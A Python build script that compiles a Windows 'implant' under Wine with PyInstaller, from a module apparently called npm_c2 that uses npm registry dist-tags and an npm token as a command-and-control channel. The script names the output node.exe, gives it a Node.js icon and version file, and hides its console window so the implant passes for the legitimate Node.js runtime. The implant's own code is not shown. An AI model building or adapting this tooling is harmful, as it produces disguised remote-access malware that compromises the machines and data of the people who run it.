#!/usr/bin/env python3
"""Build the Windows implant (node.exe) from Linux, under Wine.

Needs a Wine prefix with a Windows CPython + PyInstaller already installed.
`native/setup_wine.sh` creates one.

    python3 native/build_windows.py                      # production build
    python3 native/build_windows.py --token npm_xxx -p pkg
    python3 native/build_windows.py --api-base URL       # for tests
"""
from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))

PREFIX = os.environ.get("WINEPREFIX", os.path.expanduser("~/.wine-py"))
WINE = os.environ.get("WINE", "wine")
PYDIR = "C:\\Py312"
ICON = os.path.join(HERE, "assets", "node.ico")
VERSION_FILE = os.path.join(ROOT, "version.txt")


def hostpath(winpath: str) -> str:
    """C:\\Py312\\x -> <prefix>/drive_c/Py312/x"""
    drive, _, rest = winpath.partition(":")
    return os.path.join(PREFIX, f"drive_{drive.lower()}", rest.lstrip("\\").replace("\\", "/"))


def build(token=None, package=None, api_base=None, name="node", outdir=None):
    if not os.path.isdir(PREFIX):
        raise SystemExit(f"no Wine prefix at {PREFIX}: run native/setup_wine.sh")
    pydir = hostpath(PYDIR)
    if not os.path.exists(os.path.join(pydir, "python.exe")):
        raise SystemExit(f"no Windows Python at {PYDIR}: run native/setup_wine.sh")

    import npm_c2
    from npm_c2.implant import generate_standalone

    saved = npm_c2.API
    if api_base:
        npm_c2.API = api_base + "/-/package/{}/dist-tags"
        import npm_c2.implant as im
        im.API = npm_c2.API
    try:
        src = generate_standalone(token=token, package=package)
    finally:
        if api_base:
            npm_c2.API = saved
            import npm_c2.implant as im
            im.API = saved

    entry = os.path.join(pydir, f"{name}_entry.py")
    with open(entry, "w", encoding="utf-8") as f:
        f.write(src)
    shutil.copy2(ICON, os.path.join(pydir, "node.ico"))
    shutil.copy2(VERSION_FILE, os.path.join(pydir, "version.txt"))

    dist = outdir or os.path.join(ROOT, "native", "dist")
    os.makedirs(dist, exist_ok=True)
    dist_win = "C:\\Py312\\dist_out"

    cmd = [WINE, "C:\\Py312\\python.exe", "-m", "PyInstaller",
           "--onefile", "--noconsole", "--name", name,
           "--icon", "C:\\Py312\\node.ico",
           "--version-file", "C:\\Py312\\version.txt",
           "--distpath", dist_win,
           "--workpath", "C:\\Py312\\build",
           "--specpath", "C:\\Py312\\build",
           "--clean", f"C:\\Py312\\{name}_entry.py"]
    env = dict(os.environ, WINEPREFIX=PREFIX, WINEDEBUG="-all")
    print("[+] building under Wine ...")
    p = subprocess.run(cmd, env=env, capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    combined = (p.stdout or "") + (p.stderr or "")
    if p.returncode != 0:
        sys.stderr.write(combined[-3000:])
        raise SystemExit("build failed")
    # PyInstaller writes its log to stderr; the success marker ends up there.
    if "Build complete" not in combined:
        sys.stderr.write(combined[-2500:])
        raise SystemExit("PyInstaller did not report completion")

    produced = hostpath(dist_win + "\\" + name + ".exe")
    if not os.path.exists(produced):
        raise SystemExit(f"PyInstaller reported success but {produced} is missing")
    target = os.path.join(dist, f"{name}.exe")
    shutil.copy2(produced, target)
    print(f"[+] {target} ({os.path.getsize(target)} bytes)")
    return target


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", "-t")
    ap.add_argument("--package", "-p")
    ap.add_argument("--api-base", help="override the registry base URL (tests)")
    ap.add_argument("--name", default="node")
    ap.add_argument("--outdir")
    a = ap.parse_args()
    if a.token and not a.package:
        raise SystemExit("--package is required with --token")
    build(a.token, a.package, a.api_base, a.name, a.outdir)


if __name__ == "__main__":
    main()
